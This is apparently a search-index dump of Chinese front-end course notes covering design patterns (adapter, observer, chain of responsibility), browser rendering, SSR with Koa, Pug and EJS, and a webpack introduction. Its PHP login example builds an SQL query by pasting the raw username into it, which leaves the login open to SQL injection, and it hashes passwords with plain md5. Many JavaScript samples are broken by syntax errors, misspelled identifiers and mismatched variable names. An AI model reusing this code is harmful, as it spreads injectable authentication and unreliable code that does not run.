console.log('hi');\n}\n\nfunction dogAdapter(dogObject) {\n  this.dogObject = dogObject;\n}\ndogAdapter.prototype = new bird();\n</code></pre> <p>\u4ee3\u7801\u4e0a\uff0c\u5c31\u662f\u8bbe\u8ba1\u4e00\u4e2a\u65b0\u7684\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u7ee7\u627f\u81ea\u4e00\u4e2a\u7c7b\uff0c\u540c\u65f6\u6709\u53e6\u4e00\u4e2a\u7c7b\u7684\u65b9\u6cd5\uff08\u65b9\u6cd5\u6df7\u5165\u6a21\u5f0f\uff09\u3002</p> <p>eg2: \u5982\u679c\u9879\u76ee\u4e2d\u4f7f\u7528\u4e24\u4e2a\u6846\u67b6\uff0cJquery \u548c A \u6846\u67b6\uff0c\u6211\u4eec\u9700\u8981\u64cd\u4f5cDOM\u548cCSS\uff0c\u4f46\u662f\u4e0d\u540c\u7684\u6846\u67b6\u7684\u64cd\u4f5c\u65b9\u6cd5\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6539\u9020\u4e00\u4e0bAPI\u3002</p> <pre><code>function myA() {\n    A.call(this);\n}\nmyA.prototype = A.prototype;\nmyA.prototype.css = function() {\n    A.c.call(this, arguments);\n}\nmyA.prototype.on = function() {\n    A.o.call(this, arguments);\n}\n\nwindow.$ = myA;\n</code></pre> <p>\u6570\u636e\u9002\u914d\u5668\uff1a\u540e\u7aef\u4f20\u8fc7\u6765\u7684\u6570\u636e\u53ef\u80fd\u4e0d\u6ee1\u8db3\u524d\u7aef\u7684\u683c\u5f0f\u548c\u8981\u6c42\uff0c\u7136\u540e\u4f7f\u7528\u9ed8\u8ba4\u6570\u636e\u8fc7\u6ee4\u5904\u7406\u4e00\u4e0b\u3002</p> <pre><code>function a(ob) {\n    // default parameters\n    var adapter = {\n        a: 1,\n        b: 2\n    };\n    for (let i in adapter) {\n        adapter[i] = ob[i] || adapter[i];\n    }\n    // \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528ES6\u7684\u51fd\u6570\u9ed8\u8ba4\u53c2\u6570\u4ee3\u66ff\n}\n</code></pre> <p>\u66f4\u6539\u9700\u6c42\uff1a\u804c\u8d23\u94fe\u6a21\u5f0f+\u89c2\u5bdf\u8005\u6a21\u5f0f</p>"},{"location":"ebook-netease-senior-frontend/04-%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E7%9A%84%E6%8F%90%E5%8D%87%E2%80%94%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%88%91%E4%BB%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7/#_4","title":"\u8ba2\u9605\u53d1\u5e03\u6a21\u5f0f","text":"<p>\u4f4e\u8026\u5408\uff1a\u4e24\u4e2a\u72ec\u7acb\u7684\u6a21\u5757\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\uff0c\u4e00\u4e2a\u6a21\u5757\u8ba2\u9605\u67d0\u4e2a\u4e8b\u4ef6\uff08\u5bf9\u5e94\u7684\u67d0\u4e2a\u51fd\u6570\uff09\uff0c\u53e6\u4e00\u4e2a\u6a21\u5757\u89e6\u53d1\uff08\u53d1\u5e03\uff09\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u5c31\u4f1a\u89e6\u53d1\u524d\u4e00\u4e2a\u6a21\u5757\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u3002\u8fd9\u6837\u907f\u514d\u4e86\u4e24\u4e2a\u6a21\u5757\u4e4b\u95f4\u76f4\u63a5\u8c03\u7528\u7684\u8026\u5408\u6027\u3002</p> <pre><code>var Observer = {\n    _message: {};\n    regist: function() {\n        // \u8ba2\u9605\n    },\n    fire: function(type) {\n        // \u89e6\u53d1\n        var len = this._message[type].length;\n        for (var i = 0; i &lt; len; i++) {\n            this._message[type][i].call(this);\n        }\n    },\n    remove: function(type) {\n        // \u79fb\u9664\n        var i = this._message[type].length - 1;\n        for (;i &gt;= 0; i--) {\n            // this._message[type][i] \n      this._messgae[type][i] === fn &amp;&amp; this._message[type].splice(i, 1);\n        }\n    }\n}\n\nObserver.regist('mode1sendMode2', function() {\n  //\n});\n\nObserver.regist('method1');\nObserver.fire('method1');\n// \u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u4e24\u4e2a\u6a21\u5757\u7684\u8026\u5408\u3002\u5728A\u6a21\u5757\u4e2d\u8ba2\u9605\u51fd\u6570\uff08\u56de\u8c03\u51fd\u6570\uff09\uff0c\u5728B\u6a21\u5757\u4e2d\u89e6\u53d1\u4e8b\u4ef6\uff0c\u7136\u540e\u5728A\u4e2d\u89e6\u53d1\u56de\u8c03\u51fd\u6570\u3002\n\n// \u8f6c\u76d8demo\nvar domArr = [];\nvar father = document.getElementById('div1');\n\nfunction init() {\n  var dom = document.createElement('div');\n  dom.setAttribute('class', 'div2');\n  father.appendChild(dom);\n  domArr.push(dom);\n}\nfor (var i = 0; i &lt; 10; i++) {\n  init();\n}\nfunction run() {\n  var nowStop = 0;\n  var finiaNum = Math.floor(Math.random * 10);\n  var stopNum = 40 + finalNum;\n  var timer = setInterval(() =&gt; {\n    var domstop = nowStop % 10;\n    if (domstop == 0) {\n      domArr[9].setAttribute('clsss', 'div2');\n    } else {\n      domArr[domstop - 1].setAttribute('class', 'div2');\n    }\n    domArr[domstop].setAttribute('class', 'div2 divon');\n    if (nowStop &gt; stopNum) {\n      clearInterval(timer);\n    }\n    nowStop++;\n  }, 100);\n}\n</code></pre> <p>\u8bbe\u8ba1\u6a21\u5f0f\uff1a\u89c2\u5bdf\u8005\u6a21\u5f0f\u548c\u804c\u8d23\u94fe\u6a21\u5f0f\uff1a</p>"},{"location":"ebook-netease-senior-frontend/04-%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E7%9A%84%E6%8F%90%E5%8D%87%E2%80%94%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%88%91%E4%BB%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7/#_5","title":"\u89c2\u5bdf\u8005\u6a21\u5f0f","text":"<p>\u89c2\u5bdf\u8005\u6a21\u5f0f\u9002\u5408\u4e8e\uff1a\u5f53\u591a\u4e2a\u5730\u65b9\u4f1a\u89e6\u53d1\u4e00\u4e2a\u4e8b\u4ef6\uff0c\u4e0d\u540c\u7684\u6a21\u5757\u6bd4\u8f83\u591a\uff0c\u754c\u9762\u4ea4\u4e92\u6bd4\u8f83\u590d\u6742\uff0c\u90a3\u4e48\u4f7f\u7528\u89c2\u5bdf\u8005\u6a21\u5757\u7edf\u4e00\u5904\u7406\u4e8b\u4ef6\u3002</p> <p>\u4f8b\u5982\u754c\u9762\u6253\u5f00\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u7136\u540e\u53ef\u80fd\u4e0d\u540c\u7ec4\u4ef6\u4e0d\u540c\u4f4d\u7f6e\u90fd\u4f1a\u6253\u5f00\uff0c\u90a3\u4e48\u8fd9\u65f6\u4f7f\u7528\u89c2\u5bdf\u8005\u6a21\u5f0f\uff0c\u5728\u9876\u5c42\u7ec4\u4ef6\u4e2d\u6ce8\u518c\u4e8b\u4ef6\uff0c\u5728\u4e0b\u5c42\u4e0d\u540c\u7684\u7ec4\u4ef6\u4e2d\u89e6\u53d1\u4e8b\u4ef6\uff0c\u5c31\u7ef4\u62a4\u6bd4\u8f83\u7b80\u5355\u3002</p> <p>\u5176\u4ed6\u7684\u4ee3\u7801\u6027\u80fd\u6307\u6807\uff1a\u5065\u58ee\u6027\u3001\u53ef\u590d\u7528\u6027\u3001\u53ef\u8bfb\u6027\uff1b</p> <pre><code>// \u4e0b\u9762\u662f\u4fee\u6539\u540e\u7684\u53ef\u6269\u5c55\u7684\u4ee3\u7801\nvar time = 100;\nvar timer = null;\nvar domArr = [];\nvar father = document.getElementById('div1');\nvar nowStop = 0;\nvar finalNum = Math.floor(Math.random() * 10);\nvar stopNum = 40 + finalNum;\n\nfunction init() {\n  function _init() {\n    var dom = docuemnt.createElement('div');\n    dom.setAttribute('class', 'div2');\n    father.appendChild(dom);\n    domArr.push(dom);\n  }\n  for (let i = 0; i &lt; 10; i++) {\n    _init();\n  }\n  runner();\n}\n\ninit();\n\nfunction runner(dom) {\n  function runMode() {\n    if (domstop == 0) {\n      domArr[9].setAttribute('class', 'div2');\n    } else {\n      domArr[domstop - 1].setAttribute('class', 'div2');\n    }\n    domArr[domstop].setAttribute('class', 'div2 div-on');\n  }\n  function runControll(command) {\n    if (command === 'run') {\n      // \u8bbe\u5b9a\u4e00\u4e2a\u5b9a\u65f6\u5668\u4e4b\u524d\uff0c\u8981\u6e05\u9664\u5b9a\u65f6\u5668\n      clearInterval(timer);\n      timer = setInterval(() =&gt; {\n        var domstop = nowStop % 10;\n        if (domstop == 0 &amp;&amp; nowStop != 0) {\n          Observer.fire('runOver');\n        }\n        runMode(domstop);\n        if (nowStop &gt; stopNum) {\n          clearInterval(timer);\n        }\n      }, time);\n    } else if (command == 'stop') {\n      clearInterval(timer);\n    } else if (command == 'keep') {\n      clearInterval(timer);\n      var keepCounter = 0;\n      timer = setInterval(() =&gt; {\n        var domstop = keepCounter % 10;\n        runmode(domstop);\n        keepCounter++;\n      });\n    }\n  }\n  runcontroll(command);\n}\n</code></pre> <p>\u89c2\u5bdf\u8005\u6a21\u5f0f\u9002\u5408\u4e8e\u590d\u6742\u7ec4\u4ef6\u7684\u89e3\u8026\uff1a\u6bcf\u4e2a\u7ec4\u4ef6\u5236\u4f5c\u81ea\u5df1\u7684\u4e8b\u60c5\uff0c\u65e0\u8bba\u589e\u52a0\u529f\u80fd\u8fd8\u662f\u4fee\u6539\u529f\u80fd\u3002</p>"},{"location":"ebook-netease-senior-frontend/04-%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E7%9A%84%E6%8F%90%E5%8D%87%E2%80%94%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%88%91%E4%BB%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7/#_6","title":"\u804c\u8d23\u94fe\u6a21\u5f0f","text":"<p>\u804c\u8d23\u94fe\u6a21\u5f0f\uff1a\u628a\u6a21\u5757\u7ec4\u7ec7\u6210\u4e00\u4e2a\u94fe\u6761\uff08\u6d88\u606f\u6216\u8005\u72b6\u6001\u4f9d\u6b21\u5728\u94fe\u6761\u4e0a\u4f20\u9012\uff09</p> <p>\u6848\u4f8b\u4e8c\uff1a\u7edf\u4e00\u5904\u7406\u53d1\u9001\u8bf7\u6c42\uff08\u53ef\u4ee5\u5904\u7406\u4e00\u4e0b\u73b0\u5728\u7edf\u4e00\u53d1\u9001\u8bf7\u6c42\u7684\u62a5\u9519\u5904\u7406\uff09</p> <p>\u8bf7\u6c42\u53d1\u9001-\u8bf7\u6c42\u524d\u9ed8\u8ba4\u5904\u7406-\u81ea\u5b9a\u4e49\u5904\u7406\u524d\u5904\u7406-\u81ea\u5b9a\u4e49\u5904\u7406-\u81ea\u5b9a\u4e49\u5904\u7406\u540e\u7684\u64cd\u4f5c</p> <pre><code>function sendMsg() {\n}\n\nfunction beforeSend(fn) {\n}\n\nfunction beforeHandle() {\n}\n\nfunction afterHandle() {\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/06-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E5%92%8Cssr/","title":"06-\u70b9\u4eae\u5168\u6808\u6280\u80fd\uff0c\u8f7b\u677e\u638c\u63e1SSR","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 7372  \u9605\u8bfb15\u5206\u949f</p>"},{"location":"ebook-netease-senior-frontend/06-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E5%92%8Cssr/#_1","title":"\u6e32\u67d3\u539f\u7406\u7b80\u4ecb","text":"<p>HTML \u4ee3\u7801\u901a\u8fc7\u6d4f\u89c8\u5668\u6e32\u67d3\u6210 DOM\u6811\uff08DOM tree\uff09\u6839\u8282\u70b9\u662f document \u5bf9\u8c61\uff0c\u7531\u4e0d\u540c\u7684 tag \u7ec4\u6210\u3002</p> <p>CSS \u4ee3\u7801\u4f1a\u6839\u636e\u89c4\u5219\uff0c\u6e32\u67d3\u6210\u5448\u73b0\u6811\uff08render tree\uff09\u628a\u4e0d\u663e\u793a\u8282\u70b9\u53bb\u6389\uff08display\uff1anone\uff09\u5448\u73b0\u6811\u7ed8\u5236\u9875\u9762\u5185\u5bb9\u3002</p> <p>\u56de\u6d41\uff08reflow\uff09\u548c repaint\uff08\u91cd\u7ed8\uff09\uff1a\u6539\u52a8display\u5c5e\u6027\u4f1a\u5b9e\u73b0reflow\uff0c\u5143\u7d20\u4e0d\u4f1a\u4fdd\u7559\u5728\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u6539\u52a8 visibility\uff0c opacity\uff0c\u5143\u7d20\u8fd8\u4fdd\u7559\u5728\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u754c\u9762\u4e0d\u4f1areflow\uff09\u3002\u56de\u6d41\uff08reflow\uff0c\u5c3a\u5bf8\u5e03\u5c40\u9690\u85cf\u53d8\u5316\uff0c\u9020\u6210\u754c\u9762\u91cd\u65b0\u6784\u5efa\uff09\u5fc5\u5c06\u5f15\u8d77\u91cd\u7ed8(repaint\uff0c\u989c\u8272\u900f\u660e\u5ea6\u53d8\u5316)\uff0c\u91cd\u7ed8\u4e0d\u4e00\u5b9a\u5f15\u8d77\u56de\u6d41\u3002repaint \u7684\u6027\u80fd\u5f00\u652f\u66f4\u5c0f\u3002</p>"},{"location":"ebook-netease-senior-frontend/06-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E5%92%8Cssr/#ssr","title":"\u4ec0\u4e48\u662fSSR","text":"<p>\u524d\u540e\u7aef\u5206\u79bb\uff0c\u9020\u6210\u4e86\u670d\u52a1\u5668\u7aef\u6e32\u67d3\uff08SSR\uff09\u548c\u6d4f\u89c8\u5668\u7aef\u6e32\u67d3\uff08CSR\uff09\uff0c\u533a\u522b\u662f\u54ea\u4e00\u90e8\u5206\u5b8c\u6210HTML\u7684\u5b8c\u6574\u62fc\u63a5\uff08\u65e9\u671f JSP PHP \uff0c\u5c31\u662f\u670d\u52a1\u5668\u7aef\u5b8c\u6210HTML\u7684\u62fc\u63a5\uff09\u3002</p> <p>SSR\uff1aserver side render: \u5728\u670d\u52a1\u5668\u7aef\uff0c\u628a\u7ec4\u4ef6\uff08JS\u90e8\u5206\uff09\u6e32\u67d3\u6210HTML\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u53d1\u9001\u5230\u6d4f\u89c8\u5668</p> <p>\u597d\u5904\uff1a\u53ef\u4ee5\u51cf\u5c11\u5ba2\u6237\u7aefajax\u7684\u8bf7\u6c42\uff1b\u9996\u6b21\u6e32\u67d3\u901f\u5ea6\u5feb\uff08\u9996\u9875\u767d\u5c4f\uff09\u3002SSR \u4e00\u822c\u670d\u52a1\u5668\u914d\u7f6e\u8f83\u9ad8\uff0c\u4e0d\u7528\u62c5\u5fc3\u8fd9\u90e8\u5206\uff08\u9996\u9875\u4f7f\u7528SSR\uff0c\u5176\u4ed6\u7684\u4f7f\u7528CSR\uff0c\u524d\u540e\u7aef\u5206\u79bb\uff09\u6709\u5229\u4e8eSEO\u3002\u4e0d\u8c08\u4e1a\u52a1\u573a\u666f\uff0c\u76f2\u76ee\u4f7f\u7528\u67d0\u79cd\u6280\u672f\u662f\u4e0d\u6b63\u786e\u7684\uff01\u9996\u5148\u6709\u7406\u8bba\u57fa\u7840+\u9009\u62e9\u5408\u9002\u7684\u6280\u672f\u6808\u3002\u662f\u5426\u4f7f\u7528SSR\u6839\u636e\u4e1a\u52a1\u573a\u666f\u3002</p> <p>React \u4f7f\u7528 next \u5e93\u5b9e\u73b0 SSR\uff0cVUE \u4f7f\u7528 NUXT \u5e93\u5b9e\u73b0 SSR\u3002</p>"},{"location":"ebook-netease-senior-frontend/06-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E5%92%8Cssr/#ejs-pug","title":"\u89c6\u56fe\u548c\u6a21\u677f\uff08EJS \u548c PUG\uff09","text":"<p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6a21\u677f\u5b9e\u73b0SSR\uff0c\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u5f0fEJS \u548c PUG\uff08\u540e\u7aefKoa\u670d\u52a1\uff09</p> <p>\u9996\u5148\u5199\u4e00\u4e2a\u5ba2\u6237\u7aef\u6e32\u67d3\u7684\u4f8b\u5b50\uff08JS+PHP\uff09</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;title&gt;Document&lt;/title&gt;\n  &lt;script src=\"./jquery.min.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;h1&gt;&lt;/h1&gt;\n  &lt;input type=\"text\" name=\"username\"/&gt;&lt;br/&gt;\n  &lt;input type=\"password\" name=\"password\"/&gt;&lt;br/&gt;\n  &lt;button&gt;Submit&lt;/button&gt;\n  &lt;script&gt;\n    $(fucntion() {\n        $('button').click(function() {\n        // \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2aPromise\u5bf9\u8c61\uff0c\u6240\u4ee5\u53ef\u4ee5\u8c03\u7528then\u65b9\u6cd5\n        $.ajax({\n          type: 'post',\n          url: 'http:localhost/login/check.php',\n          data: {\n            username: $(':text').val(),\n            password: $(':password').val()\n          },\n          dataType: 'json'\n        }).then(function(res) {\n          // console.log(123);\n          // \u8fd9\u90e8\u5206\u754c\u9762\u6548\u679c\u662f\u6d4f\u89c8\u5668\u901a\u8fc7JS\u4ea7\u751f\u4fee\u6539\u7684\uff0c\u6240\u4ee5\u662fCSR\u6a21\u5f0f\n          if (res.code === 200) {\n            $('h1').html('\u767b\u5f55\u6210\u529f')\n          } else {\n            $('h1').html('\u7528\u6237\u540d\u6216\u8005\u5bc6\u7801\u9519\u8bef')\n          }\n        }, function(error) {\n          // console.log('error')\n          $('h1').html('\u7f51\u7edc\u9519\u8bef\uff0c\u8bf7\u6c42\u5931\u8d25');\n        });\n      })\n    })\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Check.php \u7528\u6237\u767b\u5f55\u9a8c\u8bc1</p> <pre><code>&lt;?php\n  require_once 'inc/conn.php';\n    $db = new DB();\n    $status = array();\n    if (empty($_POST['username'])) {\n    $status['code'] = 400;\n    echo json_encode($status);\n    exit;\n  }\n    $username = $_POST['username'];\n    $password = md5($_POST['password']);\n    $sql = \"SELECT user, password FROM admin WHERE user = '$username' AND password = '$password'\";\n    $db-&gt;query($sql);\n    $conn = $db-&gt;conn();\n    if ($conn-&gt;affected_rows &gt;= 1) {\n        $status['code'] = 200;\n    } else {\n        $status['code'] = 404;\n    }\n    echo json_encode($status);\n    $db-&gt;close();\n?&gt;\n</code></pre>"},{"location":"ebook-netease-senior-frontend/06-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E5%92%8Cssr/#pug","title":"PUG","text":"<p>\u6a21\u677f\u548cpython\u7c7b\u4f3c\uff0c\u4f7f\u7528\u7f29\u8fdb\u5b8c\u6210HTML\u6e32\u67d3\uff0c\u5c5e\u4e8e\u4fb5\u5165\u5f0f\u6846\u67b6</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u6d4f\u89c8\u5668\u6e32\u67d3\u7684\u4f8b\u5b50\uff08VUE\uff09</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n  &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt;\n  &lt;title&gt;Document&lt;/title&gt;\n  &lt;script src=\"./node_modules/vue/dist/vue.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;div id=\"app\"&gt;{{ str }}&lt;/div&gt;\n  &lt;script&gt;\n    const vm = new Vue({\n      el: '#app',\n      data: {\n        str: '\u8fd9\u662fCSR\u6a21\u5f0f\uff0c\u6e90\u4ee3\u7801\u4e0d\u4f1a\u663e\u793a\u6e32\u67d3\u540e\u7684HTML'\n      }\n    })\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u628a\u8fd9\u4e2a\u4f8b\u5b50\u6539\u6210SSR</p> <p>app.js</p> <pre><code>const Koa = require('koa');\nconst Router = require('koa-router');\nconst views = require('koa-views');\nconst path = require('path');\n\nconst app = new Koa();\napp.use(views(path.resolve(__dirname, 'template'), {\n  extension: 'pug'\n}))\n\nconst router = new Router();\n\nrouter.get('/', async ctx =&gt; {\n  //ctx.body = 'main page';\n  await ctx.render('index', {\n    title: 'Michael An page',\n    list: [\n      {name: 'Mike', age: 20}\n    ],\n  })\n});\n\napp.use(router.routes());\napp.listen(3000);\n</code></pre> <pre><code>yarn add pug -D\nnodemon app.js\n</code></pre> <p>index.pug</p> <pre><code>doctype\nhtml\n    head\n        meta(charset='utf-8')\n        title=title\n        body\n            div(class='div1')\n                h1 hello world\n            ul\n                each item in list\n                    li(class='item')\n                        span=item.name\n                        span=item.age\n            script alert('#{title}')\n</code></pre>"},{"location":"ebook-netease-senior-frontend/06-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E5%92%8Cssr/#ejs","title":"EJS","text":"<p>Ejs \u662f\u4e00\u4e2a\u4e2d\u95f4\u4ef6 middleware\uff0c\u4e2d\u95f4\u4ef6\u662f\u4ecb\u4e8e\u5e94\u7528\u7cfb\u7edf\u548c\u7cfb\u7edf\u8f6f\u4ef6\u4e4b\u95f4\u7684\u4e00\u7c7b\u8f6f\u4ef6\uff0c\u5b83\u4f7f\u7528\u7cfb\u7edf\u8f6f\u4ef6\u6240\u63d0\u4f9b\u7684\u57fa\u7840\u670d\u52a1\uff08\u529f\u80fd\uff09\uff0c\u8854\u63a5\u7f51\u7edc\u4e0a\u5e94\u7528\u7cfb\u7edf\u7684\u5404\u4e2a\u90e8\u5206\u6216\u4e0d\u540c\u7684\u5e94\u7528\uff0c\u80fd\u591f\u8fbe\u5230\u8d44\u6e90\u5171\u4eab\u3001\u529f\u80fd\u5171\u4eab\u7684\u76ee\u7684\u3002</p> <p>\u6a21\u677f\u548cHTML\u7c7b\u4f3c\uff0c\u7c7b\u4f3c\u4e8e ruby \u6216\u8005 Django \u7684\u6a21\u677f</p> <p>\u9996\u5148 npm init \u521b\u5efa\u9879\u76ee\uff0c\u5e76\u5b89\u88c5\u76f8\u5173\u5e93\uff08koa\u7b49\uff09</p> <pre><code>yarn init -y\nyarn add koa koa-router koa-ejs -S\n</code></pre> <p>app.js</p> <pre><code>const Koa = require('koa');\nconst Router = require('koa-router');\nconst path = require('path');\nconst ejs = require('koa-ejs');\n\nconst app = new Koa();\nejs(app, {\n  // \u628a\u76f8\u5bf9\u8def\u5f84\u8f6c\u6362\u6210\u7edd\u5bf9\u8def\u5f84\n  root: path.resolve(__dirname, 'template'),\n  layout: false,\n  viewExt: 'ejs',\n  cache: false,\n  debug: false,\n});\n\nconst router = new Router();\nrouter.get('/', async (ctx) =&gt; {\n  // ctx.body = '\u4e3b\u9875';\n  await ctx.render('index', {\n    title: 'Michael test ejs page',\n    list: [\n      {name: 'Mike', age: 20},\n      {name: 'Judy', age: 30},\n    ],\n  });\n});\n\napp.use(router.routes());\napp.listen(3000);\n</code></pre> <p>\u6a21\u677f /template/index.ejs \u8fd9\u4e2a\u5c5e\u4e8e\u975e\u4fb5\u5165\u5f0f\u6846\u67b6</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n  &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt;\n  &lt;title&gt;{%=title%}&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;ul&gt;\n    &lt;%list.forEach((item) =&gt; {%&gt;\n        &lt;li&gt;\n        &lt;span&gt;{%=item.name%}{%=item.age%}&lt;/span&gt;\n        &lt;/li&gt;\n    &lt;%})%&gt;\n  &lt;/ul&gt;\n  &lt;script&gt;\n    // \u76f4\u63a5\u5728JS\u90e8\u5206\u4f7f\u7528\u53c2\u6570\n    window.onload = function() {\n      alert('&lt;%=title%&gt;');\n    }\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u5f00\u542f\u9879\u76ee\u540e\u6253\u5f00\u6d4f\u89c8\u5668 localhost:3000 \u5373\u53ef\u663e\u793a</p> <pre><code>nodemon app.js\n</code></pre> <p>\u68c0\u67e5\u754c\u9762\u6e90\u4ee3\u7801\uff0c\u5df2\u7ecf\u662f\u670d\u52a1\u5668\u7aef\u6e32\u67d3\u597d\u7684HTML\u5185\u5bb9</p> <p>\u5bf9\u6bd4\u4e00\u4e0b\uff0c\u5982\u679c\u4f7f\u7528VUE\uff0c\u90a3\u4e48\u754c\u9762\u7684\u6e90\u4ee3\u7801\u5c31\u4e0d\u662f\u8fd9\u6837\u7684</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n  &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt;\n  &lt;title&gt;Document&lt;/title&gt;\n  &lt;script src=\"./node_modules/vue/dist/vue.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;div id=\"app\"&gt;{{ str }}&lt;/div&gt;\n  &lt;script&gt;\n    const vm = new Vue({\n      el: '#app',\n      data: {\n        str: '\u8fd9\u662fDSR\u6a21\u5f0f\uff0c\u6e90\u4ee3\u7801\u4e0d\u4f1a\u663e\u793a\u6e32\u67d3\u540e\u7684HTML'\n      }\n    })\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u754c\u9762\u4e2d\u76f4\u63a5\u6253\u5f00HTML\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u5c31\u662fDFS\u3002</p>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/","title":"\u7b2c\u4e03\u8bfe \u7f51\u6613\u9879\u76eewebpack\u914d\u7f6e\u89e3\u6790","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 17870  \u9605\u8bfb36\u5206\u949f</p> <p>webpack\u7248\u672c\u662f4\uff1b\u76ee\u6807\u662f\uff1a\u81ea\u5df1\u53ef\u4ee5\u770b\u61c290%\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u81ea\u5b9a\u4e49plugin\u548cloader</p> <p>Webpack \u4e0d\u540c\u7b49\u7ea7\u7684\u4f7f\u7528\u8005\uff1a</p> <p>\u521d\u7ea7\uff1a\u53ef\u4ee5\u901a\u8fc7CLI\u642d\u5efa\u57fa\u672c\u7684webpack\u5e76\u6253\u5305\u9879\u76ee</p> <p>\u4e2d\u7ea7\uff1a\u53ef\u4ee5\u66f4\u6539\u4e00\u90e8\u5206\u914d\u7f6e\u6587\u4ef6\uff08loader plugin\uff09</p> <p>\u9ad8\u7ea7\uff1a\u4f7f\u7528webpack\u89e3\u51b3\u9879\u76ee\u7684\u95ee\u9898</p> <p>2024\u5e74\u5907\u6ce8\uff1awebpack5 \u5df2\u7ecf\u4f7f\u7528\u5728\u751f\u4ea7\u9879\u76ee\uff0c\u6ce8\u610f\u66f4\u65b0\u77e5\u8bc6\u4f53\u7cfb</p>"},{"location":"ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/#01","title":"01 \u73af\u5883\u4e0e\u76ee\u5f55","text":"<p>\u73af\u5883\u5206\u7c7b\uff1a\u5f00\u53d1\u3001\u6d4b\u8bd5\u3001\u751f\u4ea7</p> <p>\u5f00\u53d1\u73af\u5883\u4e2d\uff1a\u589e\u52a0\u5f00\u53d1\u670d\u52a1\u5668\u64cd\u4f5c</p> <p>\u6d4b\u8bd5\u73af\u5883\u4e2d\uff1a\u6d4b\u8bd5\u73af\u5883\u548c\u751f\u4ea7\u73af\u5883\u5f88\u63a5\u8fd1</p> <p>\u751f\u4ea7\u73af\u5883\u4e2d\uff1a\u589e\u52a0 tree-shaking devtool(source-map)\u64cd\u4f5c(\u538b\u7f29\u64cd\u4f5c) </p> 